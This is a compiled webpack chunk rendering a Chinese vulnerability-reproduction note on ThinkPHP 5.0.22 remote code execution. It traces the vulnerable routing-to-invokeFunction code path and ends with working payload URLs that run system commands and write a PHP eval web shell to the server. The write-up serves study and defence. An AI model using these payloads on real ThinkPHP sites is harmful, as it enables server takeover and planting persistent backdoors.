"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[9005],{1260:(n,e,i)=>{i.r(e),i.d(e,{assets:()=>r,contentTitle:()=>h,default:()=>o,frontMatter:()=>l,metadata:()=>s,toc:()=>p});const s=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","title":"Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/01.Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/01.Thinkphp5.0.22\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"\u57fa\u7ebf\u68c0\u67e5","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u57fa\u7ebf\u68c0\u67e5/"},"next":{"title":"Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316"}}');var t=i(4848),c=i(8453);const l={},h=void 0,r={},p=[{value:"\u5f71\u54cd\u7248\u672c",id:"\u5f71\u54cd\u7248\u672c",level:2},{value:"\u6f0f\u6d1e\u5206\u6790",id:"\u6f0f\u6d1e\u5206\u6790",level:2},{value:"Payload",id:"payload",level:2}];function d(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,c.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,t.jsx)(e.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,t.jsx)(e.tbody,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{style:{textAlign:"left"},children:(0,t.jsx)(e.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,t.jsx)(e.td,{style:{textAlign:"left"},children:"2025-08-19 16:46:45"})]})})]}),"\n",(0,t.jsx)(e.p,{children:"\u200b\t\t\u7531\u4e8e\uff0cthinkphp 5.0.23 \u4ee5\u53ca5.1.31 \u4e4b\u524d\u7684\u7248\u672c\u90fd\u672a\u5f3a\u5236\u5f00\u542f\u8def\u7531\uff0c\u6240\u4ee5\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u63d0\u4ea4\u6076\u610f\u53c2\u6570\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"}),"\n",(0,t.jsx)(e.h2,{id:"\u5f71\u54cd\u7248\u672c",children:"\u5f71\u54cd\u7248\u672c"}),"\n",(0,t.jsx)(e.p,{children:"\u200b\t\tthinkphp  \u5f53\u524d\u7248\u672c< 5.0.22"}),"\n",(0,t.jsx)(e.h2,{id:"\u6f0f\u6d1e\u5206\u6790",children:"\u6f0f\u6d1e\u5206\u6790"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.p,{children:["get\u8bf7\u6c42  ",(0,t.jsx)(e.code,{children:"index.php?s=index/think\\app/invokefunction&function=system&vars[0]=dir&vars[1][]="})]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"1\uff09\u4ece\u5165\u53e3index.php \u9996\u5148\u4f1a\u6765\u5230 thinkphp \u7684\u521d\u59cb\u5316\u6587\u4ef6"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"thinkphp/library/think/App.php -> run() "})}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646809.png",alt:"image-20220321153031865"})}),"\n",(0,t.jsx)(e.p,{children:"2\uff09\u56e0\u4e3a\u6f0f\u6d1ePOC\u4e0e\u6846\u67b6\u7684url\u5904\u7406\u6709\u5173\uff0c\u6240\u4ee5\u76f4\u63a5\u8ddf\u5230URL\u8def\u7531\u68c0\u6d4b\u51fd\u6570"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"thinkphp/library/think/App.php -> run() "})," 116"]}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646810.png",alt:"image-20220321153239864"})}),"\n",(0,t.jsx)(e.p,{children:"3\uff09\u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u4f1a\u68c0\u6d4b url\u53c2\u6570\uff0c\u901a\u8fc7\u53c2\u6570\u8bbf\u95ee\u7c7b\u6216\u8005\u65b9\u6cd5 \u6216\u8005\u6a21\u677f"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"thinkphp/library/think/App.php-> routeCheck()"}),"\n"]}),"\n",(0,t.jsxs)(e.p,{children:["\u200b\t\t\u8be5\u65b9\u6cd5\u4e2d\uff0c\u7b2c620\u884c \u8c03\u7528",(0,t.jsx)(e.code,{children:"$request->path()"})," \u8fd4\u56de\u4e86 url\u4e2d\u7684s\u53c2\u6570\u503c"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646811.png",alt:"image-20220321154826904"})}),"\n",(0,t.jsx)(e.p,{children:"\u7b2c643 \u4f1a\u89e3\u6790\u8def\u7531\uff0c\u5982\u679c \u6ca1\u6709\u7528\u8def\u7531\u4f1a\u8fd4\u56defalse"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646812.png",alt:"image-20220321155231182"})}),"\n",(0,t.jsx)(e.p,{children:"\u200b\t\t\u7b2c 654\u884c \u5f53\u4e3a\u65e0\u6548\u8def\u7531\u65f6\uff0c\u4f1a\u53bb\u89e3\u6790\u517c\u5bb9\u8def\u7531\uff0c"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646813.png",alt:"image-20220321155428658"})}),"\n",(0,t.jsxs)(e.p,{children:["4\uff09\u8ddf\u8fdb ",(0,t.jsx)(e.code,{children:"Route::parseUrl"})]}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"thinkphp/library/think/Route.php->parseUrl()"})," 1217"]}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646814.png",alt:"image-20220321155637197"})}),"\n",(0,t.jsxs)(e.p,{children:["\u200b\t\t\u8be5\u65b9\u6cd5\u4e2d\uff0c\u5728\u7b2c1225\u884c \u4f1a\u5c06$url \u5373s\u53c2\u6570\u4e2d\u7684\u503c\uff0c",(0,t.jsx)(e.code,{children:"/"})," \u66ff\u6362\u6210",(0,t.jsx)(e.code,{children:"|"}),",\u7528\u4e8e\u89e3\u6790 \u6a21\u677f| \u63a7\u5236\u5668|\u64cd\u4f5c|\u53c2\u6570"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646815.png",alt:"image-20220321160229396"})}),"\n",(0,t.jsxs)(e.p,{children:["\u200b\t\t\u6700\u7ec8\uff0c\u5f80\u56de\u8d70\uff0c\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9 ",(0,t.jsx)(e.code,{children:"$result"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646816.png",alt:"image-20220321161309138"})}),"\n",(0,t.jsx)(e.p,{children:"5\uff09\u6700\u7ec8\u56de\u5230run()\u65b9\u6cd5\u4e2d\uff0c"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"thinkphp/library/think/App.php > run() 139"}),"\n"]}),"\n",(0,t.jsxs)(e.p,{children:["\u200b\t\t\u5728",(0,t.jsx)(e.code,{children:"self::exec()"})," \u5c06\u83b7\u5f97\u7684 ",(0,t.jsx)(e.code,{children:"$dispatch"})," \u505a\u64cd\u4f5c"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646817.png",alt:"image-20220321161642624"})}),"\n",(0,t.jsxs)(e.p,{children:["6\uff09\u7ee7\u7eed\u8ddf\u8fdb\uff0c\u7531\u4e8e ",(0,t.jsx)(e.code,{children:"$dispatch"})," \u4e2d\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\uff0c",(0,t.jsx)(e.code,{children:"'module'"}),"\u5219\u4f1a\u53bb\u8c03\u7528\uff0c",(0,t.jsx)(e.code,{children:"self::module"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646818.png",alt:"image-20220321161927364"})}),"\n",(0,t.jsxs)(e.ol,{start:"7",children:["\n",(0,t.jsx)(e.li,{children:"\u5728self::module \u7b2c585\u884c\u4f1a\u505a\u5bf9\u6bd4\uff0c\u770b\u6a21\u677f\u65b9\u6cd5\u662f\u5426\u5b58\u5728\uff0c\u5b58\u5728\u5219\u4f1a\u8fdb\u5165if\u8bed\u53e5\u4e2d"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646819.png",alt:"image-20220321162809024"})}),"\n",(0,t.jsxs)(e.p,{children:["8.\u6700\u540e\u8fd4\u56de\u503c\uff0c\u8c03\u7528",(0,t.jsx)(e.code,{children:"self::invokeMethod"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646820.png",alt:"image-20220321162853374"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u8be5\u65b9\u6cd5\u4e2d\u4f1a\u751f\u6210ReflectionMethod\u5bf9\u8c61\uff0c\u6700\u540e\u7684\u8fd4\u56de\u503c\uff0c\u8c03\u7528 ReflectionMethod\u5bf9\u8c61\u7684invokeArgs \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u56de\u8c03\u4e00\u4e2a\u65b9\u6cd5 \u5373 $args\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\uff0c\u5373 ",(0,t.jsx)(e.code,{children:"invokeFunction"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646821.png",alt:"image-20220321165756665"})}),"\n",(0,t.jsx)(e.p,{children:"9\uff09\u6700\u540e\u5728InvokeFunction \u65b9\u6cd5\u6267\u884c\u5371\u9669\u51fd\u6570"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://cdn.wjlin0.com/img/202508191646822.png",alt:"image-20220321170004451"})}),"\n",(0,t.jsx)(e.p,{children:"\u6ce8\uff1a\u5173\u4e8e\u5728ReflectionMethod\u7684\u4f7f\u7528\u53ef\u53c2\u8003"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://www.php.net/manual/zh/class.reflectionmethod.php",children:"PHP: ReflectionMethod - Manual"})}),"\n"]}),"\n",(0,t.jsx)(e.h2,{id:"payload",children:"Payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"http://localhost/index.php?s=index/think\\app/invokefunction&function=system&vars[0]=whoami&vars[1][]=\n\nhttp://localhost/index.php?s=index/think\\app/invokefunction&function=call_func_user_array&vars[0]=system&vars[1][]=whoami\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"http://localhost/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=sad.php&vars[1][1]=<?php eval($_POST[cmd])?>\n"})})]})}function o(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},8453:(n,e,i)=>{i.d(e,{R:()=>l,x:()=>h});var s=i(6540);const t={},c=s.createContext(t);function l(n){const e=s.useContext(c);return s.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function h(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:l(n.components),s.createElement(c.Provider,{value:e},n.children)}}}]);